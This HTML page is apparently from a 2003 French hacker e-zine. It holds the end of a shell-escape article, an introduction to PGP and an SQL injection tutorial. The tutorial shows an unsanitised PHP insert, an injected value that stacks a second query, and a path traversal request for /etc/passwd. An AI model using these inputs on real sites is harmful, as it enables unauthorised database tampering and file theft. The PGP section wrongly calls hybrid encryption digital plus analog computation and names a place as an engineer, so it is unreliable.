<p><font color="#FFFFFF">N'oubliez pas aussi de regarder du c&ocirc;t&eacute; 
  du custom log (le deuxi&egrave;me log), on peut parfois ex&eacute;cuter du code 
  &agrave;</font><font color="#FFFFFF">l'int&eacute;rieur, comme pour le premier 
  fichier de log. </font></p>
<p><font color="#FFFFFF"><br>
  <u><strong>IV. VOILA</strong></u> <br>
  </font></p>
<p><font color="#FFFFFF">Bref, cet article vous a pr&eacute;sent&eacute; quelques 
  m&eacute;thodes d'escapes shells pouvant s'av&eacute;rer n&eacute;fastes pour 
  un serveur. </font></p>
<p><font color="#FFFFFF">N'essayez pas d'attaquer le serveur Arenhack de la sorte, 
  toutes les informations fournis &agrave; son propos dans cet </font><font color="#FFFFFF">article 
  sont toutes erron&eacute;es. N'oubliez pas que, tout &ccedil;a c'est pour le 
  fun, et que l'essentiel est de comprendre ces </font><font color="#FFFFFF">techniques, 
  afin de pouvoir se pr&eacute;munir et mieux s&eacute;curiser les syst&egrave;mes. 
  </font></p>
<p><font color="#FFFFFF"><br>
  <font color="#0099FF"><em>Have fun, <br>
  <font color="#FFCC00">Nocte</font> [DHS] / For ArenHack Team -- <font color="#00CC99">M.I.B. 
  #1 </font><br>
  <u>greetz</u> : medgi (subk), MeiK (IOC), etherlord (DHS), CL@D &amp; SpS6m3N 
  (AH) </em></font> </font></p>
<p><font color="#FFFFFF">--[EOF]-- </font></p>
<p>&nbsp;</p>
<p align="center"><font color="#FFFFFF">_________________________________________________________________________________________________________</font> 
  <font color="#FFFFFF"><br>
  </font></p>
<p align="center"><font color="#000000">---</font><font color="#000000">---</font><font color="#FF0000">/~~~~~~~~~~~~~~~~\</font><br>
  <font color="#000000">-------</font><font color="#FF0000">--=&lt; |-</font> 
  <strong><font color="#FFFFFF" size="4">PGP Introducing</font></strong><font color="#FF0000">-| 
  &gt;=--</font> <br>
  <font color="#000000">------</font><font color="#FF0000">\~~~~~~~~~~~~~~~~/</font></p>
<p align="left">&nbsp;</p>
<p><font color="#FFFFFF"><strong><u>I. Introduction </u></strong></font></p>
<p><font color="#FFFFFF"><em><strong>P</strong>retty <strong>G</strong>ood <strong>P</strong>rivacy</em> 
  (<strong>PGP</strong>) est un programme gratuit de protection du courrier &eacute;lectronique 
  con&ccedil;u en 1991 par Philip Zimmermann. Sa philosophie est que tout individu 
  a droit &agrave; la confidentialit&eacute;, notamment les organisations des 
  droits de l'homme dans des pays soumis &agrave; la dictature ; et c'est plut&ocirc;t 
  pas mal de nos jours . C'est dans cette optique qu'il a cr&eacute;&eacute; PGP 
  et qu'il l'a mis &agrave; disposition gratuitement sur Internet . Cela lui a 
  valu de s&eacute;rieux ennuis avec la justice am&eacute;ricaine, car les logiciels 
  de cryptage sont consid&eacute;r&eacute;s comme du mat&eacute;riel de guerre 
  ( )et sont interdits &agrave; l'exportation. Apr&egrave;s bien des d&eacute;m&ecirc;l&eacute;s 
  judiciaires, on lui donna gain de cause, et bien heureusement ! </font></p>
<p>&nbsp;</p>
<p><font color="#FFFFFF"><strong><u>II. Fonctionnement de PGP</u></strong> </font></p>
<p><font color="#FFFFFF">PGP est une combinaison des fonctionnalit&eacute;s de 
  la cryptographie &agrave; clef publique et de la cryptographie conventionnelle. 
  PGP est un syst&egrave;me de cryptographie hybride, c'est &agrave; dire qu'il 
  utilise &agrave; la fois le calcul num&eacute;rique et le calcul analogique(= 
  repr&eacute;sent&eacute; par la variation continue d'une certaine grandeur). 
  Lorsqu'un utilisateur crypte du texte en clair avec PGP, ces donn&eacute;es 
  sont d'abord compress&eacute;es. Cette compression des donn&eacute;es permet 
  de r&eacute;duire le temps de transmission par modem, d'&eacute;conomiser l'espace 
  disque et, surtout, de renforcer la s&eacute;curit&eacute; cryptographique. 
  La plupart des cryptanalystes exploitent les mod&egrave;les trouv&eacute;s dans 
  le texte en clair pour casser le chiffrement. La compression r&eacute;duit ces 
  mod&egrave;les dans le texte en clair, am&eacute;liorant par cons&eacute;quent 
  consid&eacute;rablement la r&eacute;sistance &agrave; la cryptanalyse. Toutefois, 
  la compression est impossible sur les fichiers de taille insuffisante ou supportant 
  mal ce processus. </font></p>
<p><font color="#FFFFFF">PGP cr&eacute;e ensuite une clef de session qui est une 
  clef secr&egrave;te &agrave; usage unique. Cette clef correspond &agrave; un 
  nombre al&eacute;atoire, g&eacute;n&eacute;r&eacute; par les d&eacute;placements 
  al&eacute;atoires de votre souris et les s&eacute;quences de frappes de touches. 
  Pour crypter le texte en clair, cette clef de session utilise un algorithme 
  de cryptage conventionnel rapide et s&eacute;curis&eacute;. Une fois les donn&eacute;es 
  cod&eacute;es, la clef de session est crypt&eacute;e vers la clef publique du 
  destinataire. Cette clef de session crypt&eacute;e par clef publique est transmise 
  avec le texte chiffr&eacute; au destinataire. <br>
  Pour crypter et d&eacute;crypter, PGP utilise deux algorithmes distincts : l'IDEA 
  : un algorithme &agrave; cl&eacute; sym&eacute;trique et le RSA : un algorithme 
  &agrave; cl&eacute; asym&eacute;trique. <br>
  L'op&eacute;ration de cryptage se fait donc en 2 &eacute;tapes principales : 
  <br>
  - PGP cr&eacute;e tout d'abord une cl&eacute; secr&egrave;te IDEA de mani&egrave;re 
  al&eacute;atoire, et crypte les donn&eacute;es avec cette cl&eacute;. <br>
  - PGP crypte ensuite la cl&eacute; secr&egrave;te IDEA (pr&eacute;c&eacute;demment 
  cr&eacute;&eacute;e) au moyen de la cl&eacute; publique RSA du destinataire. 
  <br>
  De m&ecirc;me, l'op&eacute;ration de d&eacute;cryptage se fait elle aussi en 
  2 &eacute;tapes : <br>
  - PGP d&eacute;crypte la cl&eacute; secr&egrave;te IDEA au moyen de la cl&eacute; 
  priv&eacute;e RSA. <br>
  - PGP d&eacute;crypte les donn&eacute;es avec la cl&eacute; secr&egrave;te IDEA 
  pr&eacute;c&eacute;demment obtenue. <br>
  C'est la combinaison algorithme sym&eacute;trique (IDEA pour crypter les donn&eacute;es) 
  / algorithme asym&eacute;trique (RSA pour crypter la cl&eacute; IDEA) qui conf&egrave;re 
  &agrave; PGP sa vitesse et sa grande s&eacute;curit&eacute;. </font></p>
<p><font color="#FFFFFF"><em><br>
  Deux sch&eacute;mas pour illustrer ces quelques lignes : </em></font></p>
<p><img src="M.I.B Mag #1_fichiers/pgp1.gif" width="508" height="234"></p>
<p><font color="#FFCC00">Le processus de d&eacute;cryptement est inverse. La copie 
  de PGP du destinataire utilise sa clef priv&eacute;e pour r&eacute;cup&eacute;rer 
  la clef de session temporaire qui permettra ensuite de d&eacute;crypter le texte 
  crypt&eacute; de mani&egrave;re conventionnelle. </font></p>
<p>&nbsp;</p>
<p><font color="#009966"><img src="M.I.B Mag #1_fichiers/pgp2.gif" width="507" height="221"></font></p>
<p> </p>
<p><u><font color="#FFFFFF">Pour voir les sch&eacute;mas distinctement : </font></u><font color="#FFFFFF"><br>
  <a href="http://membres.lycos.fr/jackercrack/pgp1.gif">1er Sch&eacute;ma </a><br>
  <a href="http://membres.lycos.fr/jackercrack/pgp2.gif">2&egrave;me Sch&eacute;ma 
  </a></font></p>
<p><font color="#FFFFFF"><br>
  <font color="#FF3333">Ces deux m&eacute;thodes de cryptage associent la facilit&eacute; 
  d'utilisation du cryptage &agrave; clef publique &agrave; la vitesse du cryptage 
  conventionnel. Le cryptage conventionnel est environ 1000 fois plus rapide que 
  le cryptage &agrave; clef publique. De plus, le cryptage &agrave; clef publique 
  r&eacute;sout non seulement le probl&egrave;me de la distribution des clefs, 
  mais &eacute;galement de la transmission des donn&eacute;es. Utilis&eacute;es 
  conjointement, ces deux m&eacute;thodes am&eacute;liorent la performance et 
  la distribution des clefs, sans pour autant compromettre la s&eacute;curit&eacute;. 
  </font></font></p>
<p>&nbsp;</p>
<p><font color="#FFFFFF"><strong>III. Distribution </strong></font></p>
<p><font color="#FFFFFF">Il existe plusieurs versions versions de PGP, certaines 
  freeware et d'autres commerciales. </font></p>
<p><font color="#FFFFFF">Apr&egrave;s une mise au rancart pr&eacute;matur&eacute;e 
  des versions commerciales par Network Associates, une nouvelle compagnie nomm&eacute; 
  PGP Corporation semble avoir pris le relais (et les droits) pour d&eacute;velopper 
  les fonctionnalit&eacute;s corporatives avanc&eacute;es de cet outil. Toutefois 
  les versions commerciales sont d&eacute;velopp&eacute;es sans partager le code 
  source (ce qui pour un logiciel d'encryption est inqui&eacute;tant ), tandis 
  que la version gratuite offerte n'a pas toutes les fonctionnalit&eacute;s requises. 
  Il n'y a donc aucune utilit&eacute; d'installer une version commerciale sur 
  votre ordinateur. </font></p>
<p><font color="#FFFFFF">Il existe plusieurs &quot;versions&quot; de PGP pour 
  Windows en freeware. Elles se ressemblent tous parce que le code source est 
  public. Trois distributions dominent: </font></p>
<p><font color="#FFFFFF">1) Celle, limit&eacute;e, de PGP Corporation <br>
  2) Celles disponibles sur <a href="http://www.pgpi.org/%20">http://www.pgpi.org/ 
  </a><br>
  3) Celles nomm&eacute;es &quot;CKT&quot; disponibles sur <a href="http://www.ipgpp.com/%20">http://www.ipgpp.com/ 
  </a></font></p>
<p><font color="#FFFFFF">Qu'importe la version, elles sont gratuites et elles 
  marcheront bien pour un usage de base. </font></p>
<p><font color="#FFFFFF">Plusieurs v&eacute;t&eacute;rans pr&eacute;f&egrave;rent 
  n&eacute;anmoins la version CKT qui incorpore une fonctionnalit&eacute; qui 
  n'apparaissait que dans la version commerciale de PGP, soit l'extension PGPDisk 
  qui permet de faire des &quot;disques virtuels&quot; encrypt&eacute;s( un peu 
  comme Steganos Security Suite 4 ) </font></p>
<p>&nbsp;</p>
<p><font color="#FFFFFF"><em>Lien direct download :</em></font></p>
<p><font color="#FFFFFF"> <a href="http://www.pcastuces.com/telechargement.aspnum=22%20">http://www.pcastuces.com/telechargement.aspnum=22 
  </a><br>
  <a href="http://www.pgp.com/">http://www.pgp.com/</a> <br>
  <a href="http://www.gnupg.org/">http://www.gnupg.org/</a> (GNU) </font></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><font color="#FFFFFF"><strong><u>IV. Vunl&eacute;rabilit&eacute; ? </u></strong></font></p>
<p><font color="#FFFFFF">Pour <u>eEye Digital Security</u> (l&#8217;&eacute;diteur 
  de solutions logicielles phare en mati&egrave;re de s&eacute;curit&eacute; r&eacute;seau 
  et l&#8217;un des leaders de la recherche et de la formation dans ce domaine. 
  Ses produits sont ax&eacute;s sur la s&eacute;curit&eacute; &laquo; proactive 
  &raquo; et int&egrave;grent des fonctions particuli&egrave;rement adapt&eacute;es 
  aux besoins des administrateurs r&eacute;seau et des consultants s&eacute;curit&eacute;. 
  Ils compl&egrave;tent parfaitement les outils classiques tels que les firewalls 
  et les syst&egrave;mes de d&eacute;tection d&#8217;intrusions pour assurer une 
  protection r&eacute;seau &agrave; toute &eacute;preuve. ) , PGP serait vuln&eacute;rable 
  : une faille permettrait de s'introduire sur l'ordi d'un utilisateur PGP et 
  de d&eacute;chiffrer les messages cod&eacute;s. Selon les d&eacute;couvertes 
  de l'ing&eacute;nieur Aliso Viejo de <u>eEye Digital Security</u>, les logiciels 
  de <u>Network Associates</u>, <u>PGP Desktop Security 7.0.4</u>, <u>PGP Personal 
  Security 7.0.3</u> et <u>PGP Freeware 7.0.3</u> pourraient &ecirc;tre concern&eacute;s.... 
  </font></p>
<p>&nbsp;</p>
<p><font color="#FFFFFF"><strong><u>V. Conclusion </u></strong></font></p>
<p><font color="#FFFFFF"><strong>PGP</strong> (<em><strong>P</strong>retty <strong>G</strong>ood<strong> 
  P</strong>rivacy</em>) est un puissant outil de cryptage de donn&eacute;es fait 
  par un vrai passionn&eacute; qui est rest&eacute; de glace devant les obstacles 
  pos&eacute;s devant lui (merci &agrave; lui ) . PGP permet de chiffrer des informations 
  afin de ne les rendre accessibles qu'aux destinataires d&eacute;sign&eacute;s. 
  <br>
  Le fonctionnement de PGP repose sur l'utilisation de deux cl&eacute;s compl&eacute;mentaires 
  : une <font color="#33CC99"><em>cl&eacute; publique</em></font> et une <font color="#33CC99"><em>cl&eacute; 
  priv&eacute;e</em></font>. <br>
  A la fois gratuit et puissant, PGP assure une parfaite confidentialit&eacute; 
  des donn&eacute;es et semble &ecirc;tre un des meilleurs logiciels en mati&egrave;re 
  de cryptage. </font></p>
<p></p>
<p><img src="M.I.B Mag #1_fichiers/pgp3.jpg" width="139" height="83"></p>
<p></p>
<p><font color="#FFFFFF" size="5" face="Monotype Corsiva">JaCkEr</font></p>
<p><font color="#FFFFFF">Copyright &copy; 2003 ArenHack</font></p>
<p> </p>
<p><font color="#FFCC00"><u>Sources : </u></font><font color="#FFFFFF"><br>
  <a href="http://www.philzimmermann.com/">http://www.philzimmermann.com/</a> 
  <br>
  <a href="http://www.pgpi.org/%20">http://www.pgpi.org/ </a><br>
  <a href="http://www.openpgp.fr.st/%20">http://www.openpgp.fr.st/ </a><br>
  <a href="http://www.jura.ch/%20">http://www.jura.ch/ </a><br>
  </font></p>
<p>&nbsp;</p>
<p align="center"><font color="#FFFFFF">_________________________________________________________________________________________________________</font> 
  <font color="#FFFFFF"><br>
  </font></p>
<p align="center">&nbsp;</p>
<p align="center"><font color="#000000">----</font><font color="#000000">--</font><font color="#FF0000">/~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\</font><br>
  <font color="#000000">-------</font><font color="#FF0000">--=&lt; |-</font> 
  <strong><font color="#FFFFFF" size="4">SQL Injection : Black Hole Security</font></strong><font color="#FF0000">-| 
  &gt;=--</font> <br>
  <font color="#000000">------</font><font color="#FF0000">\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/</font></p>
<p align="left">&nbsp;</p>
<p align="left"><font color="#FFFFFF"><u>Les diff&eacute;rentes techniques d&#8217;injection 
  se d&eacute;rouleront de la fa&ccedil;on suivante :</u></font></p>
<p><font color="#FFFFFF"><u><strong>- I. Introduction<br>
  - II. Mam, what that mean SQL?<br>
  - III. Les diff&eacute;rentes requ&ecirc;tes<br>
  - IV. Exploitation des failles</strong></u><br>
  - <font color="#000000">_<font color="#CCFFFF">1) </font></font><font color="#CCFFFF">Inscription 
  &agrave;une newsletter.<br>
  <font color="#FFFFFF">-</font><font color="#000000"> _</font>2)Post de news 
  ou commentaires (architecture assez tordu)<br>
  <font color="#FFFFFF">-</font> <font color="#000000">_</font>3)Proc&eacute;dure 
  d&#8217;authentification en PHP. (+ requ&ecirc;tes SQL li&eacute;es au PHP)</font><br>
  <strong><u>- V. S&eacute;curit&eacute;<br>
  - VI. Conclusion<br>
  - VII. Sources, inspiration et remerciement</u></strong></font></p>
<p>&nbsp;</p>
<p align="center"><font color="#FFFFFF">= = = = = = = = = = = = = = = = = = = 
  = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
  = = = = = = = = = = = = = = </font></p>
<p>&nbsp;</p>
<p><font color="#FFFFFF"><strong><u>I. Introduction</u></strong></font><font color="#FFFFFF"><br>
  </font></p>
<p><font color="#FFFFFF">L&#8217;injection par requ&ecirc;te SQL est une faille 
  tr&egrave;s rependue sur le Web qui est exploitable assez facilement par certains 
  SK en manques de sensation&#8230;<br>
  L&#8217;injection SQL est un simple terme signifiant l&#8217;acte de passer 
  dans une application un code SQL non pr&eacute;vu par le d&eacute;velopper.<br>
  Elle est extr&ecirc;mement dangereuse puisqu&#8217;elle permet de manipuler 
  directement les bases de donn&eacute;es des sites pouvant entra&icirc;n&eacute; 
  de nombreuses possibilit&eacute;s comme le vol de mot de passes, de donn&eacute;es, 
  utiliser les droits d&#8217;administrateur, modifier une newsletter, changement 
  d&#8217;un post sur un forum, et j&#8217;en passe...<br>
  Mais avant tout rappelons que l&#8217;injection est possible a cause d&#8217;un 
  mauvais filtrage au niveau de l&#8217;entr&eacute; de l&#8217;utilisateur donc 
  il est possible d&#8217;outre passe certaine protection SQL login/password... 
  ;)</font></p>
<p>&nbsp;</p>
<p><font color="#FFFFFF"><strong><u>II. Mum, what that mean SQL ?</u></strong><br>
  </font></p>
<p><font color="#FFFFFF">Par d&eacute;finition SQL (&laquo; langage d&#8217;interrogation 
  structur&eacute; &raquo;, de l&#8217;anglais &laquo; Structured Query Language 
  &raquo;) est un langage qui vous permet de communiquer avec les bases de donn&eacute;es?, 
  pour se faire il faut envoyer une (des) requ&ecirc;te(s) au serveur de base 
  de donn&eacute;es. La plupart du temps les requ&ecirc;tes sont faite gr&acirc;ce 
  a des application en PHP/ASP/CFML/JSP...</font></p>
<p>&nbsp;</p>
<p><font color="#FFFFFF"><u><strong>III. Les diff&eacute;rentes requ&ecirc;tes</strong></u><br>
  </font></p>
<table width="44%" border="1">
  <tr>
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">Alter 
      Table (Base de donn&eacute;es et table)<br>
      Create Database (Base de donn&eacute;es et table)<br>
      Create Function (User Defined Functions)<br>
      Create Index (Manipulation des donn&eacute;es)<br>
      Create Table (Base de donn&eacute;es et table)<br>
      Delete (Manipulation des donn&eacute;es)<br>
      Describe (Information sur les bases)<br>
      Drop Database (Base de donn&eacute;es et table)<br>
      Drop Function (User Defined Functions)<br>
      Drop Index (Manipulation des donn&eacute;es)<br>
      Explain (Information sur les bases)<br>
      Flush (Manipulation des donn&eacute;es)<br>
      Grant (Gestion des droits d'acc&egrave;s)<br>
      Insert (Manipulation des donn&eacute;es)<br>
      Kill (Manipulation des donn&eacute;es)<br>
      Load Data (Manipulation des donn&eacute;es)<br>
      Lock Tables (Gestion des droits d'acc&egrave;s)<br>
      Optimize Table (Base de donn&eacute;es et table)<br>
      Replace (Manipulation des donn&eacute;es)<br>
      Revoke (Gestion des droits d'acc&egrave;s)<br>
      Select (Manipulation des donn&eacute;es)<br>
      Set (Information sur les bases)<br>
      Show (Information sur les bases)<br>
      Unlock Tables (Gestion des droits d'acc&egrave;s)<br>
      Update (Manipulation des donn&eacute;es)<br>
      Use (Base de donn&eacute;es et table)</font></td>
  </tr>
</table>
<p><font color="#FFFFFF"> </font></p>
<p>&nbsp;</p>
<p><font color="#FFFFFF"><strong><u>IV. Exploitation des failles de programmations</u></strong></font><font color="#FFFFFF"><br>
  </font></p>
<p><font color="#FFFFFF">Bon alors on commence par quoi ? Y&#8217;en &agrave; 
  tellement mais moi j&#8217;opterai plut&ocirc;t pour commencer par des bases 
  en SQL (maniement des donn&eacute;es) puis apr&egrave;s le plus simple pour 
  un peut vous &eacute;chauffer, inscription a une newsletter, puis apr&egrave;s 
  une proc&eacute;dure d&#8217;authentification en PHP, et apr&egrave;s on verra 
  ;)</font></p>
<blockquote>
  <p><font color="#CCFFFF"><u>1) Newsletter </u></font></p>
</blockquote>
<p><font color="#FFFFFF">Pour ce cas de figure on va directement communiquer avec 
  la base de donn&eacute;e ;)<br>
  On va commencer tranquillement avec cette mise en situation : soit la table 
  (My) SQL &laquo; newsletter &raquo; comportant 2 champs a remplir, le nom (pseudo) 
  et email (l&#8217;adresse email). Quelques commandes avant de s&#8217;attaquer 
  a la faille :<br>
  <br>
  Tout d&#8217;abord pour s&eacute;lection la ligne et le nom ou pseudo &laquo; 
  Skin &raquo; on va demander : &laquo; <font color="#FF0000" size="2" face="Courier New, Courier, mono">select 
  * from newsletter where nom=&#8217;Skin&#8217;</font> &raquo;</font></p>
<p><font color="#FFFFFF">Presque pareil, pour s&eacute;lectionner l&#8217;email 
  et le nom de la personne: &#8220;Skin&#8221; : &laquo; <font color="#FF0000" size="2" face="Courier New, Courier, mono">Select 
  nom, email from newsletter where nom = &#8217;Skin&#8217; </font>&raquo;</font></p>
<p><font color="#FFFFFF">Pour remplacer l&#8217;email de la personne nomm&eacute; 
  Skin par Skin@arenhack.com: &laquo; <font color="#FF0000" size="2" face="Courier New, Courier, mono">update 
  newsletter set email=&#8217;Skin@Arenhack.com&#8217; where nom= &#8217;Skin&#8217;</font> 
  &raquo;</font></p>
<p><font color="#FFFFFF">Pour effacer l&#8217;inscrit nomm&eacute; Skin avec ses 
  information bien sur (nom+email) : &laquo; <font color="#FF0000" size="2" face="Courier New, Courier, mono">delete 
  from newsletter where nom=&#8217;Skin&#8217;</font> &raquo;</font></p>
<p><font color="#FFFFFF">Pour la totale maintenant, ex&eacute;cuter plusieurs 
  requ&ecirc;te SQL sur une ligne il faut les finir par un &laquo; ; &raquo;. 
  &laquo; <font color="#FF0000" size="2" face="Courier New, Courier, mono">delete from newsletter where 
  nom=&#8217;Skin&#8217;; delete from newsletter nom=&#8217;Skin2&#8217;</font> 
  &raquo;</font></p>
<p><font color="#FFFFFF">Voila! C&#8217;est quand m&ecirc;me ultra simple, je 
  pense que vous comprenez mieux maintenant ;)<br>
  </font></p>
<p><font color="#FFFFFF"><u>Maintenant passons aux l&#8217;explication :</u></font></p>
<p><font color="#FFFFFF">Vous arrivez sur un site Web qui vous propose de vous 
  inscrire &agrave; une newsletter, super non ?<br>
  Vous arrivez sur le m&ecirc;me type de formulaire vue pr&eacute;c&eacute;demment, 
  c'est-&agrave;-dire nom plus email, par th&eacute;orie vous allez remplir les 
  2 champs et vous inscrire normalement comme n&#8217;importe qui ;)<br>
  Mais sinon quand vous avez appuyer sur ce petit bouton &laquo; <font color="#FF0000" face="Courier New, Courier, mono">SEND</font> 
  &raquo; que c&#8217;est-il vraiment passer derri&egrave;re ? C&#8217;est le 
  genre de question que personne ne se pose &ccedil;a encore !</font></p>
<p><font color="#FFFFFF">Comme vu pr&eacute;c&eacute;demment, le formulaire va 
  envoyer un script a la base SQL qui va demander d&#8217;ajouter une ligne, &#8216;nom&#8217; 
  plus &#8216;email&#8217;.<br>
  Maintenant si on analyse le code source de la page, on pourra peut &ecirc;tre 
  tomber l&agrave;-dessus :</font></p>
<table width="53%" border="1">
  <tr>
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;impute 
      type=text name= &quot;nom &quot;&gt;&lt;input type=text name= &quot;email 
      &quot; &gt;</font></td>
  </tr>
</table>
<p><font color="#FFFFFF"><br>
  Toujours la m&ecirc;me chose, on suppose que le script va demander d&#8217;ajouter 
  une ligne de la base de donn&eacute;e SQL du site.<br>
  Admettons que Skin a tap&eacute; son nom et son email et qu&#8217;il a valid&eacute;, 
  la formulaire passer les variable a un script qui les interpr&eacute;ter et 
  en faire des requ&ecirc;tes SQL sur le serveur de base de donn&eacute;es.<br>
  Le script va rajouter une ligne dans la table newsletter de la fa&ccedil;on 
  suivante : (en PHP)</font></p>
<table width="51%" height="136" border="1">
  <tr>
    <td><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;? <br>
      Connexion au server SQL <br>
      mysql_query(&quot;insert into newsletter ('$nom','$email')&quot;); //ex&eacute;cution 
      de la requ&ecirc;tes <br>
      echo &quot;Vous venez d\'&ecirc;tre inscrit &agrave; la newsletter\n&quot;; 
      <br>
      // ce script est basique mais c'est plus simple pour d&eacute;buter <br>
      ?&gt;</font></td>
  </tr>
</table>
<p><font color="#FFFFFF"></font></p>
<p><font color="#FFFFFF">Analysons ce code, on voit que les variables ($nom &amp; 
  $email) correspondent aux noms qu&#8217;on avait attribu&eacute; au tag <font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;input&gt;</font> 
  du formulaire vu un peut plus haut en HTML.<br>
  Le script va donc ex&eacute;cuter la requ&ecirc;te : &laquo; <font color="#FF0000" size="2" face="Courier New, Courier, mono">insert 
  into newsletter (&#8216;Skin&#8217;,&#8217;Skin@arenhack.com&#8217;)</font> 
  &raquo;</font></p>
<p><font color="#FFFFFF">Voila, Skin a &eacute;t&eacute; ajouter a la base de 
  donn&eacute;es SQL, le codeur est content son script marche bien. </font></p>
<p><font color="#FFFFFF">Mais ce n&#8217;est pas fini, car pour l&#8217;instant 
  nous avons juste d&eacute;montr&eacute; que Skin &eacute;tait bien inscrit dans 
  la base donn&eacute;e SQL du serveur gr&acirc;ce &agrave; un scripte qui va 
  interpr&eacute;ter les variables.Mais maintenant allons un peut plus loin dans 
  l&#8217;ex&eacute;cution du script, essayons d&#8217;inscrire 2 personne en 
  une seul fois.</font></p>
<p><font color="#FFFFFF">Que va-t-il falloir faire pour inscrire 2 personnes en 
  m&ecirc;me temps ? IL va falloir qu&#8217;on ex&eacute;cute 2 requ&ecirc;tes 
  SQL en m&ecirc;me temps sur la m&ecirc;me ligne s&eacute;parer par un &laquo; 
  ; &raquo;<br>
  Ce qui va donn&eacute;e quelque chose dans ce genre :<br>
  &quot;<font color="#FF0000" size="2" face="Courier New, Courier, mono">insert into newsletter ('billy','billy@billy.fr');insert 
  into newsletter ('billy2','billy2@billy.fr')</font>&quot;</font></p>
<p><font color="#FFFFFF">Donc si nous voulons ex&eacute;cuter ce type de requ&ecirc;te 
  sur un serveur SQL, il va falloir que notre script PHP l&#8217;ex&eacute;cute 
  :</font></p>
<table width="69%" border="1">
  <tr>
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">Nom 
      : Skin<br>
      Email: &laquo; Skin@arenhack.com&#8217;);insert into newsletter (&#8216;Skin2&#8217;,&#8217;Skin2@arenhack.com&#8217;)</font></td>
  </tr>
</table>
<p><font color="#FFFFFF"><br>
  Le but est &#8220;d&#8217;imbriqu&eacute;&#8221; une nouvel requ&ecirc;te SQL 
  sur la m&ecirc;me ligne dans notre variable <font color="#FF0000" size="2" face="Courier New, Courier, mono">$email</font><br>
  Je sais pas si vous m&#8217;avez suivit, mais c&#8217;&eacute;tait juste un 
  exemple concret, c&#8217;est sure que maintenant vous aller pas vous amuser 
  a inscrire 2 personne en une fois a une newsletter c&#8217;est sure. Mais vous 
  avez appris les &laquo; bases &raquo; si je pourrais dire du stockage et du 
  d&eacute;placement des donn&eacute;es SQL.</font></p>
<p><font color="#FFFFFF"><em>Mais d&#8217;autres probl&egrave;mes se posent :</em></font></p>
<p><font color="#FFFFFF">D&eacute;j&agrave; dans le cas pr&eacute;c&egrave;dent, 
  c&#8217;&eacute;tait vraiment super simple puisqu&#8217;on connaissait d&eacute;j&agrave; 
  le nom de la table et en plus nous savions comment &eacute;t&eacute; structur&eacute; 
  le script PHP.</font></p>
<p><font color="#FFFFFF">Mais en r&eacute;alit&eacute; ce ne sont pas les seuls 
  probl&egrave;mes :</font></p>
<p><font color="#FFFFFF">- Si nous ne connaissons pas la requ&ecirc;te SQL et 
  que le script l&#8217;aurai envoy&eacute; au serveur SQL alors nous airions 
  une page d&#8217;erreur, donc d&eacute;j&agrave; cette faille ne s&#8217;adapte 
  pas dans tout les cas.<br>
  Ensuite pour &eacute;crire notre requ&ecirc;te, nous ne poss&eacute;dons pas 
  assez d&#8217;information car il y aurait tr&egrave;s bien pu avoir un champ 
  ID avant le nom et l&#8217;email ou tout autre chose donc nous ne connaissons 
  pas l&#8217;existence.</font></p>
<p></p>
<p><font color="#FFFFFF">En faite au d&eacute;part, l&#8217;attaque est supers 
  simple, mais elle est compromise par pas mal de facteur comme le type de la 
  base de donn&eacute;es, le nom de la table, le nom des champs, etc....comme 
  je viens de vous le prouvez.<br>
  C&#8217;est pour cela que l&#8217;ont dit dans ce cas, que le serveur et une 
  black box, une boite noir autrement dit.</font></p>
<p><font color="#FFFFFF">Mais il y a un point que je n&#8217;est pas encore abord&eacute;, 
  comment d&eacute;celer ce genre de faille.<br>
  Cela peut &ecirc;tre aussi important que pour le hacker, que pour le webmaster 
  qui veut s&eacute;curiser son site.</font></p>
<p><font color="#FFFFFF">- Alors d&#8217;abord analyser le code source de la page, 
  pour se faire afficher le a partir de votre navigateur ou enregistrez le sur 
  votre HD. Maintenant, regardez le nom des variable qui vont &ecirc;tre envoyer 
  et essayer de trouver des <font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;input type=hidden&gt;</font> 
  qui pourrait nous aider.</font></p>
<p><font color="#FFFFFF">- Maintenant, on va faire comme tout a l&#8217;heure, 
  mettez vous a la place du programmeur et le programmeur a la place du hacker 
  vis versa.<br>
  Vous vous rappelez ce qu&#8217;on avait dit sur le nom de la table ? Un nom 
  simple, pas &laquo; GHUYF89 &raquo;, donc une faut un peut d&#8217;intuition 
  pour trouver le bon nom de la table/champs.</font></p>
<p><font color="#FFFFFF">- Maintenant essayer de provoquer une erreur lors de 
  l&#8217;ex&eacute;cution du script, une requ&ecirc;te qui n&#8217;est pas attendu 
  par le serveur car si le script est mal cod&eacute; vous pourrez voir la ligne 
  de code afficher par votre browser ce qui vous permettra de voir le code source. 
  Aussi vous pouvais utiliser une technique Buffer Overflow en mettant un maximum 
  de donn&eacute;es qui ne sont pas attendu par le serveur comme #|^^&pound;*&ugrave;% 
  !;: &raquo;&#8217;--_@ .<br>
  Mais avant m&ecirc;me de vous &eacute;puiser a faire sa, taper &#8216;ou &raquo; 
  dans un champs et si le serveur ne vous retourne aucune erreur, le script risque 
  d&#8217;&ecirc;tre s&eacute;curise a 99%?.</font></p>
<p><font color="#FFFFFF">Apres avoir vue la technique du Buffer Overflow, il y 
  a aussi celle d&#8217;utiliser un exploit sur le serveur Web pour r&eacute;cup&eacute;r&eacute; 
  le code source :</font></p>
<p><font color="#FFFFFF">-Utilisez showcode.asp sur IIS installer par d&eacute;faut 
  (encore une connerie...)</font></p>
<p><font color="#FFFFFF">- Si vous avez un script sur le serveur, ce sui st assez 
  fr&eacute;quent, qui permet de t&eacute;l&eacute;charger un fichier en passant 
  par le nom en variable comme par exemple <font color="#FF0000" size="2" face="Courier New, Courier, mono">downloads.cgi 
  ?file=fichier.zip</font> il suffit d&#8217;un peut d&#8217;intelligence pour 
  transformer le script en <font color="#FF0000" size="2" face="Courier New, Courier, mono">downloads.cgi 
  ?file=fichier.zip</font> qu&#8217;on veut sans oublier qu&#8217;il est peut 
  &ecirc;tre possible de remonter dans le r&eacute;pertoire <font color="#FF0000" size="2" face="Courier New, Courier, mono">downloads.cgi 
  ?file=../../../etc/passwd</font>. </font></p>
